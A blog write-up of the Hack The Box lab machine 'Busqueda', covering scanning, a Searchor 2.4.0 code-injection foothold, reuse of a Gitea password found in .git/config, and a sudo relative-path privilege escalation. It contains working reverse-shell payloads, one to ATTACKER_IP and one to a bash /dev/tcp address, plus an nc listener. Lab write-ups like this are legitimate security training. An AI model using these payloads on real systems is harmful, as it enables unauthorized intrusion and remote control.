---
title: Busqueda
published: 2024-08-06
description: Writeup for an easy labeled linux based HTB machine named Busqueda.
image: ./busqueda/busqueda_pwned.png
tags: [HackTheBox, Linux, Machines]
category: Writeups
draft: false
---

# <center> Busqueda </center>

## Quick notes:
- easy linux based machine

## Scanning and enumeration

### whatweb
```bash
┌──(cyb3ritic㉿kali)-[~/Downloads]
└─$ whatweb 10.10.11.208                        
http://10.10.11.208 [302 Found] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.11.208], RedirectLocation[http://searcher.htb/], Title[302 Found]
ERROR Opening: http://searcher.htb/ - no address for searcher.htb
```
- host: http://searcher.htb

### nmap scan
```bash
┌──(cyb3ritic㉿kali)-[~/Downloads]
└─$ sudo nmap -sC -sV 10.10.11.208             
Nmap scan report for 10.10.11.208
Host is up (0.0019s latency).
Not shown: 837 filtered tcp ports (no-response), 161 closed tcp ports (reset)

PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)

80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://searcher.htb/
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### feroxbuster and other enumeration
- No useful information

## searching andd exploiting vulnerability

### web interface
![web interface](./busqueda/web_interface.png)

- input field
- powered by searchor 2.4.0

### script kidde method

- [poc of searchor 2.4.0 on google](https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-)
    - `', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#`

    - searching the above prompt will get u a revese shell and can grab user.txt.

- `la -al` -> .git folder.
- .git/config reveals a url `http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git`
    - we have creds `cody:jh1usoih2bkjaspwe92`
    - we got a domain name `gitea.searcher.htb`

- password for svc user is same as that of cody.
- `sudo -l` reveals

### Playing with input field (alternative method) 
- SSTI
- payload: 
```python
,),__import__('os').system('bash -c "bash -i >& /dev/tcp/10.10.14.41/1234 0>&1"')#
```

- `nc -lnvp 1234`

- get reverse shell on target machine. `cat ~/user.txt` gives user flag.

<hr>

## Privesc enumeration

- `ls -al` -> gind .git -> `cd .git` -> `ls` -> config file -> `cat config`
url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git

- May be ssh id ?? cody:jh1usoih2bkjaspwe92
- new domain: gitea.searcher.htb. Let's add it as well to /etc/hosts and check the web.
  ![new website at gitea.searcher.htb](./busqueda/new_website.png)

- let's login with the above credentials for cody.
![logged in as cody](./busqueda/loggedin_cody.png)

- nothing much interesting in website for this user.(another use `administrator` is also present but we don't have access to it right now.)
  
<hr>
Let's check for ssh.

- target 1 : ssh login -> cody:jh1usoih2bkjaspwe92 ==> permission denied
- target 2 : ssh login -> svc:jh1usoih2bkjaspwe92  ==> logged in
    - thus creds for svc is svc:jh1usoih2bkjaspwe92

<hr>

- `sudo -l` -> (root) /usr/bin/python3 /opt/scripts/system-checkup.py *

- `sudo pyhton3 /opt/sccripts/system-checkup.py *`

```bash
-bash-5.1$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```
---
Running docker-ps
```bash
-bash-5.1$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED         STATUS        PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   19 months ago   Up 17 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   19 months ago   Up 17 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```
-> two conatainers gitea and mysql_db are up.

---
Running docker-inspect
```bash
-bash-5.1$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
```

-> need to pass a format and container name as well. 

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq
```
![gitea admin password](./busqueda/gitea_admin_pass.png)

- couldnot login to mysql with this credentials.
- try for administrator user in gitea.searcher.htb. -> successfully logged in
![loggedin as administrator](./busqueda/loggedin_admin.png)

- In scripts repository, we can find system-checkup.py script whic could be run as sudo by us on the server.
```bash
#!/bin/bash
import subprocess
import sys

actions = ['full-checkup', 'docker-ps','docker-inspect']

def run_command(arg_list):
    r = subprocess.run(arg_list, capture_output=True)
    if r.stderr:
        output = r.stderr.decode()
    else:
        output = r.stdout.decode()

    return output


def process_action(action):
    if action == 'docker-inspect':
        try:
            _format = sys.argv[2]
            if len(_format) == 0:
                print(f"Format can't be empty")
                exit(1)
            container = sys.argv[3]
            arg_list = ['docker', 'inspect', '--format', _format, container]
            print(run_command(arg_list)) 
        
        except IndexError:
            print(f"Usage: {sys.argv[0]} docker-inspect <format> <container_name>")
            exit(1)
    
        except Exception as e:
            print('Something went wrong')
            exit(1)
    
    elif action == 'docker-ps':
        try:
            arg_list = ['docker', 'ps']
            print(run_command(arg_list)) 
        
        except:
            print('Something went wrong')
            exit(1)

    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
            

if __name__ == '__main__':

    try:
        action = sys.argv[1]
        if action in actions:
            process_action(action)
        else:
            raise IndexError

    except IndexError:
        print(f'Usage: {sys.argv[0]} <action> (arg1) (arg2)')
        print('')
        print('     docker-ps     : List running docker containers')
        print('     docker-inspect : Inpect a certain docker container')
        print('     full-checkup  : Run a full system checkup')
        print('')
        exit(1)
```

- for full checkup, the script is using relative path to search `full-checkup.py`. We can exploit it by creating our own file with malicious code and name it as `full-checkup.sh` and then run the python program.

```bash
#!/bin/bash
cat /root/root.txt
```
- this code will directly give me the root flag without having to do much of work. let's try it.

![root flag](./busqueda/root_pass.png)

voila. we got the root flag.

## Hope you all liked it. Thankyou.
